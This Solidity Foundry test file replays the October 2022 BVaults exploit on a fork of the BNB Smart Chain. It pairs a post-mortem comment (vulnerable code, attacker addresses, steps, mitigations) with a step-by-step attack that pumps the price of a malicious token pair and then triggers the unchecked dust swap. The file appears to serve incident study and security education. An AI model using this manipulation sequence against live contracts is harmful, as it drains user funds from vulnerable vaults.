// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../TestHarness.sol";
import {IERC20} from "../interfaces/IERC20.sol";

import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';

// forge test --match-contract Exploit_BVaults -vvv

/*
On Oct 30, 2022 an attacker stole over $35,000 from BVaults. 
The price was manipulated and exploited a dust swapping function due to the lack of price checks inflating the price of an artificial pair.

// Attack Overview
Total Lost: over $35,000
Attack Tx: https://bscscan.com/tx/0xe7b7c974e51d8bca3617f927f86bf907a25991fe654f457991cbf656b190fe94
Ethereum Transaction Viewer: https://tx.eth.samczsun.com/binance/0xe7b7c974e51d8bca3617f927f86bf907a25991fe654f457991cbf656b190fe94

Exploited Contract: 
Attacker Address: 0x5bfaa396c6fb7278024c6d7230b17d97ce8ab62d
Attacker Contracts: 0x4a7c762d9af1066c9241c8c1b63681fd1b438d05, 0x1958d75C082D7F10991d07e0016B45a0904D2Eb1
Attack Block: 22629432

// Key Info Sources
Twitter: https://twitter.com/BeosinAlert/status/1588579143830343683
Code: https://bscscan.com/address/0xb2b1dc3204ee8899d6575f419e72b53e370f6b20#code

Malicious Token Deploy: https://bscscan.com/tx/0xf6d11637c31c3b9ea8bb1828a958b56f687a67409ca3010f5293ae7a934de694
Malicious Token Mint: https://bscscan.com/tx/0xf244f0b412bc0a9637b7af84b7b2cda04e1003923b22e9aef5c778ebad6ee214


Principle: Unchecked price while performing swaps

    function convertDustToEarned() public whenNotPaused {
        require(isAutoComp, "!isAutoComp");

        // Converts dust tokens into earned tokens, which will be reinvested on the next earn().

        // Converts token0 dust (if any) to earned tokens
        uint256 _token0Amt = IERC20(token0Address).balanceOf(address(this));
        if (token0Address != earnedAddress && _token0Amt > 0) {
            _vswapSwapToken(token0Address, earnedAddress, _token0Amt);
        }

        // Converts token1 dust (if any) to earned tokens
        uint256 _token1Amt = IERC20(token1Address).balanceOf(address(this));
        if (token1Address != earnedAddress && _token1Amt > 0) {
            _vswapSwapToken(token1Address, earnedAddress, _token1Amt);
        }
    }

    function _vswapSwapToken(address _inputToken, address _outputToken, uint256 _amount) internal {
        IERC20(_inputToken).safeIncreaseAllowance(vswapRouterAddress, _amount);
        IValueLiquidRouter(vswapRouterAddress).swapExactTokensForTokens(_inputToken, _outputToken, _amount, 1, vswapPaths[_inputToken][_outputToken], address(this), now.add(1800));
    }

(*) token0Address is a global variable for the BDEX token https://bscscan.com/address/0x7e0f01918d92b2750bbb18fcebeedd5b94ebb867#readProxyContract
ATTACK:
1) Create a malicious token and pair
2) Inflate its price
3) Call convertDustToEarned
4) Swap again
5) Cashout and repeat

MITIGATIONS:
1) Relying on token balances only for price calculations could be potentially manipulated
2) It is important to use more robust data sources (time weighting, oracles, among others) and checking sudden price changes.

*/

interface IERC20_Burnable is IERC20 {
    function burn(uint256 amount) external;
}
interface BVaultsStrategy {
    function convertDustToEarned() external;
}

interface Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
}

contract Exploit_BVaults is TestHarness, TokenBalanceTracker {

    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 BDEX = IERC20(0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867);
    IERC20_Burnable maliciousToken = IERC20_Burnable(0x12D18106FC0B3c70AD6C917d247E14941Cdd0f3F);
    BVaultsStrategy vaultsStrategy = BVaultsStrategy(0xB2B1DC3204ee8899d6575F419e72B53E370F6B20);

    Pair internal constant BDEXWBNB_PAIR = Pair(0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D);
    Pair internal constant MALICIOUS_PAIR = Pair(0xD35378e477d5D32f87AB977067561DAf9a2c32aA);

    address internal constant ATTACKER = 0x5bFAA396C6FB7278024C6d7230B17d97Ce8aB62D;
    address internal constant ATTACKER_CONTRACT = 0x1958d75C082D7F10991d07e0016B45a0904D2Eb1;

    function setUp() external {
        cheat.createSelectFork("bsc", 22629431); // We pin one block before the exploit happened

        cheat.label(ATTACKER, "Attacker");
        cheat.label(ATTACKER_CONTRACT, "Attacker Contract");

        emit log_string("Initial Attacker Balances");
        emit log_named_decimal_uint("Malicious Token", maliciousToken.balanceOf(ATTACKER),18); 

        addTokenToTracker(address(WBNB));
        addTokenToTracker(address(BDEX));
        addTokenToTracker(address(maliciousToken)); // Apparently, the tracker does not catch this token.

        emit log_string("\nInitial");
        logBalancesWithLabel('Malicious Contract', ATTACKER_CONTRACT);
        logBalancesWithLabel('Vault Contract', address(vaultsStrategy));
    }

    function test_attack() external {
        cheat.startPrank(ATTACKER);
        // 1: Sent malicious tokens to the pair
        require(maliciousToken.transfer(address(MALICIOUS_PAIR), 10_000 ether), "transfer failed"); // Sends 10.000 tokens to the pair

        // 2: Swap to get WBNB into a malicious contract
        emit log_string("\nBefore Swap Balances");
        logBalancesWithLabel('Malicious Contract', ATTACKER_CONTRACT);
        logBalancesWithLabel('Vault Contract', address(vaultsStrategy));

        MALICIOUS_PAIR.swap(0, 34534837254230472565, ATTACKER_CONTRACT, "");

        emit log_string("\nAfter Swap Balances");
        logBalancesWithLabel('Malicious Contract', ATTACKER_CONTRACT);
        logBalancesWithLabel('Vault Contract', address(vaultsStrategy));
        cheat.stopPrank();

        // 3: Transfer, Swap, Convert with BDEXBNB Pair and Vault Strategy
        cheat.startPrank(ATTACKER_CONTRACT);
        emit log_string("\nBefore Transfer, Swap, Convert Balances");
        logBalancesWithLabel('Malicious Contract', ATTACKER_CONTRACT);
        logBalancesWithLabel('Vault Contract', address(vaultsStrategy));

        require(WBNB.transfer(address(BDEXWBNB_PAIR), 34534837254230472565), "transfer failed");
        BDEXWBNB_PAIR.swap(14181664488335977539333, 0, ATTACKER_CONTRACT, ""); // WBNB for BDEX
        vaultsStrategy.convertDustToEarned();

        emit log_string("\nAfter Transfer, Swap, Convert Balances");
        logBalancesWithLabel('Malicious Contract', ATTACKER_CONTRACT);
        logBalancesWithLabel('Vault Contract', address(vaultsStrategy));

        // 4: Transfer the BDEX back to the BDEX Pair
        require(BDEX.transfer(address(BDEXWBNB_PAIR), BDEX.balanceOf(ATTACKER_CONTRACT)), "transfer failed");
        BDEXWBNB_PAIR.swap(0, 50800786874975680419, ATTACKER_CONTRACT, ""); // BDEX for WBNB
        emit log_string("\n After last swap Balances");
        logBalancesWithLabel('Malicious Contract', ATTACKER_CONTRACT);
        logBalancesWithLabel('Vault Contract', address(vaultsStrategy));

        // 5: Transfer back to the pair 
        require(WBNB.transfer(address(MALICIOUS_PAIR), WBNB.balanceOf(ATTACKER_CONTRACT)), "transfer failed");
        MALICIOUS_PAIR.swap(10229179233811368474425, 0, ATTACKER_CONTRACT, "");
        maliciousToken.burn(10229179233811368474425);
    }

}